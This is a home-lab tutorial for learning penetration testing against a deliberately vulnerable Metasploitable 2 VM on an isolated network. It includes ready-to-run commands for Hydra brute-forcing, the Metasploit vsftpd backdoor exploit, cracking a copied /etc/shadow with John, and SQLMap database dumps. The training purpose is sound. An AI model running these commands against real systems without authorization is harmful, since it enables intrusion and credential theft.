# 🛡️ Cybersecurity Home Lab Setup Guide

> Free, local, no limits — Nmap, Hydra, Wireshark, Metasploit + vulnerable targets

---

## 📋 Overview

This guide sets up a **free, fully local cybersecurity practice lab** on Arch Linux using:

- Real tools installed natively (Nmap, Hydra, Wireshark, Metasploit, etc.)
- **Metasploitable 2** as an intentionally vulnerable target VM
- **VirtualBox** to run the target VM safely isolated
- **TryHackMe** for guided learning context (free tier)
- **PortSwigger Web Security Academy** for web attack labs (100% free)

> [!tip] Why local over browser labs? No daily VM limits, no paywalls, break things freely, faster performance, and you learn real tool installation/config — skills that matter in actual jobs.

---

## 🗂️ Table of Contents

- [[#Part 1 Install the Tools]]
- [[#Part 2 Set Up VirtualBox]]
- [[#Part 3 Download and Import Metasploitable 2]]
- [[#Part 4 Configure Network (Host-Only)]]
- [[#Part 5 Verify Your Lab]]
- [[#Part 6 Tool Quick References]]
- [[#Part 7 Free Learning Resources]]
- [[#Part 8 Practice Workflow]]

---

## Part 1: Install the Tools

Open your terminal and install everything in one go:

```bash
sudo pacman -S nmap wireshark-qt hydra metasploit john hashcat netcat sqlmap gobuster
```

> [!note] What each tool does
> 
> |Tool|Purpose|
> |---|---|
> |`nmap`|Network scanning, port discovery, service detection|
> |`wireshark-qt`|Packet capture and analysis (GUI)|
> |`hydra`|Brute-force login attacks (SSH, FTP, HTTP, etc.)|
> |`metasploit`|Exploitation framework|
> |`john`|Password hash cracking (John the Ripper)|
> |`hashcat`|GPU-accelerated password cracking|
> |`netcat`|Raw TCP/UDP connections, reverse shells|
> |`sqlmap`|Automated SQL injection|
> |`gobuster`|Directory/file brute-forcing on web servers|

### Fix Wireshark permissions (so you can capture without sudo)

```bash
sudo usermod -aG wireshark $USER
newgrp wireshark
```

Log out and back in for this to fully apply.

### Initialize Metasploit database

```bash
sudo msfdb init
msfconsole
```

Type `exit` to quit after it loads. This just confirms it works.

---

## Part 2: Set Up VirtualBox

VirtualBox is needed to run the vulnerable target VM (Metasploitable 2) safely isolated from your real network.

```bash
sudo pacman -S virtualbox virtualbox-host-modules-arch
sudo modprobe vboxdrv
sudo usermod -aG vboxusers $USER
newgrp vboxusers
```

Start VirtualBox to confirm it works:

```bash
virtualbox
```

> [!warning] Kernel module note If `modprobe vboxdrv` fails after a kernel update, run:
> 
> ```bash
> sudo pacman -S linux-headers
> sudo modprobe vboxdrv
> ```

---

## Part 3: Download and Import Metasploitable 2

Metasploitable 2 is an intentionally vulnerable Linux VM made by Rapid7 (the Metasploit creators) — it's the standard practice target for learning pentesting tools.

**Download link:** https://sourceforge.net/projects/metasploitable/

It downloads as a `.zip` file. Extract it:

```bash
unzip metasploitable-linux-2.0.0.zip -d ~/VMs/Metasploitable2/
```

### Import into VirtualBox

1. Open VirtualBox
2. Click **New**
3. Name: `Metasploitable2`
4. Type: `Linux`
5. Version: `Ubuntu (64-bit)`
6. Memory: `512 MB` is enough
7. Hard disk: Choose **Use an existing virtual hard disk file**
8. Browse to the extracted `.vmdk` file inside `~/VMs/Metasploitable2/`
9. Click **Create**

---

## Part 4: Configure Network (Host-Only)

> [!danger] Critical step — do NOT skip this Metasploitable 2 is full of vulnerabilities by design. Running it on your real network is dangerous. Host-Only networking isolates it so only your machine can reach it.

### Create a Host-Only network in VirtualBox

1. Go to **File → Host Network Manager**
2. Click **Create** — it creates `vboxnet0` with IP range `192.168.56.0/24`
3. Leave DHCP server enabled

### Assign Host-Only adapter to Metasploitable 2

1. Select your Metasploitable2 VM → **Settings → Network**
2. Set **Adapter 1** to: `Host-only Adapter`
3. Name: `vboxnet0`
4. Click **OK**

### Start the VM and find its IP

Boot Metasploitable 2 inside VirtualBox. Default credentials:

- Username: `msfadmin`
- Password: `msfadmin`

Once logged in, run:

```bash
ifconfig
```

Note the IP address (usually `192.168.56.101`). This is your **target IP** for all practice.

---

## Part 5: Verify Your Lab

From your Arch Linux host terminal (not inside the VM), run a basic Nmap scan to confirm connectivity:

```bash
nmap -sV 192.168.56.101
```

You should see a big list of open ports and services. If you do — **your lab is working.**

> [!success] Expected output (partial)
> 
> ```
> 21/tcp   open  ftp        vsftpd 2.3.4
> 22/tcp   open  ssh        OpenSSH 4.7p1
> 23/tcp   open  telnet
> 80/tcp   open  http       Apache httpd 2.2.8
> 3306/tcp open  mysql      MySQL 5.0.51a
> ```
> 
> These are all intentionally vulnerable services you'll practice against.

---

## Part 6: Tool Quick References

### 🔍 Nmap

```bash
# Basic scan
nmap 192.168.56.101

# Service version detection
nmap -sV 192.168.56.101

# OS detection + scripts + traceroute
nmap -A 192.168.56.101

# All ports
nmap -p- 192.168.56.101

# Vulnerability scripts
nmap --script vuln 192.168.56.101

# Save output to file
nmap -sV -oN scan_results.txt 192.168.56.101
```

---

### 🔐 Hydra (Brute Force)

```bash
# SSH brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# FTP brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101

# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Multiple usernames + passwords
hydra -L users.txt -P passwords.txt ssh://192.168.56.101
```

> [!note] rockyou.txt location on Arch If `/usr/share/wordlists/rockyou.txt` doesn't exist, install it:
> 
> ```bash
> sudo pacman -S wordlists
> ```
> 
> Or download directly: `wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`

---

### 🦈 Wireshark

Launch the GUI:

```bash
wireshark
```

**Key filters to know:**

|Filter|What it shows|
|---|---|
|`tcp`|All TCP traffic|
|`http`|HTTP requests/responses|
|`ftp`|FTP traffic (credentials visible in plaintext!)|
|`ip.addr == 192.168.56.101`|Traffic to/from your target|
|`tcp.port == 22`|SSH traffic only|
|`http.request.method == "POST"`|POST requests (login attempts)|

**Workflow:** Start capture on your Host-Only interface (`vboxnet0`), then run Hydra or Nmap in another terminal and watch the packets live.

---

### 💥 Metasploit

```bash
msfconsole
```

**Basic workflow:**

```bash
# Search for an exploit
search vsftpd

# Use an exploit (vsftpd 2.3.4 backdoor — present on Metasploitable 2)
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
set RHOSTS 192.168.56.101

# Run it
exploit
```

**Other useful Metasploit commands:**

```bash
# Show exploit options
show options

# List available payloads
show payloads

# Search by CVE
search cve:2008

# Background a session
background

# List active sessions
sessions -l

# Interact with a session
sessions -i 1
```

---

### 🔑 John the Ripper (Password Cracking)

```bash
# Crack a hash file
john hashes.txt

# Use a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack Linux /etc/shadow
sudo cp /etc/shadow ~/shadow.txt
john ~/shadow.txt
```

---

### 🗄️ SQLMap (SQL Injection)

```bash
# Basic scan of a URL parameter
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"

# List databases
sqlmap -u "http://target/page?id=1" --dbs

# Dump a specific database
sqlmap -u "http://target/page?id=1" -D dvwa --dump
```

---

### 📁 Gobuster (Directory Brute Force)

```bash
# Directory scan
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# DNS subdomain brute force
gobuster dns -d target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
```

---

## Part 7: Free Learning Resources

### Structured Guides (use alongside your lab)

|Resource|What it covers|Cost|
|---|---|---|
|[TryHackMe](https://tryhackme.com)|Guided rooms for every tool, beginner to advanced|Free tier|
|[PortSwigger Web Security Academy](https://portswigger.net/web-security)|Web attacks, Burp Suite, OWASP Top 10|100% Free|
|[Hack The Box Academy](https://academy.hackthebox.com)|Network pentesting, enumeration, privilege escalation|Free tier|
|[OverTheWire: Bandit](https://overthewire.org/wargames/bandit/)|Linux fundamentals via SSH challenges|100% Free|
|[PicoCTF](https://picoctf.org)|Beginner CTF challenges|100% Free|

### Recommended TryHackMe Rooms (free)

- **Nmap** — dedicated Nmap room with tasks
- **Hydra** — brute forcing walkthrough
- **Metasploit: Introduction** — guided Metasploit basics
- **Wireshark: The Basics** — packet analysis fundamentals
- **OWASP Top 10** — web vulnerabilities
- **Blue** — EternalBlue exploit (beginner-friendly)
- **Basic Pentesting** — full beginner pentest workflow

---

## Part 8: Practice Workflow

A good session looks like this:

```
1. Boot Metasploitable 2 in VirtualBox (Host-Only mode)
2. Confirm target IP: nmap -sn 192.168.56.0/24
3. Enumerate: nmap -sV -A 192.168.56.101
4. Pick a service to attack based on what you found
5. Research the vulnerability (Google, ExploitDB, TryHackMe room)
6. Exploit it (Metasploit, Hydra, SQLMap, manual, etc.)
7. Document what you did in Obsidian
```

> [!tip] After Metasploitable 2 — next targets
> 
> - **DVWA** (Damn Vulnerable Web App) — web-specific practice, runs in Docker
> - **VulnHub** — downloadable VMs of varying difficulty, all free
> - **HackTheBox free tier** — retired machines available for free

---

## 🔒 Safety Reminders

> [!danger] Always remember
> 
> - Only attack systems you own or have explicit written permission to test
> - Keep Metasploitable 2 on **Host-Only** networking — never bridge it to your real network or the internet
> - Shut down the VM when not in use
> - These tools are legal to own and learn with — using them against real targets without permission is illegal everywhere

---

_Guide created for Arch Linux (Hyprland) — adapt package manager commands if using a different distro._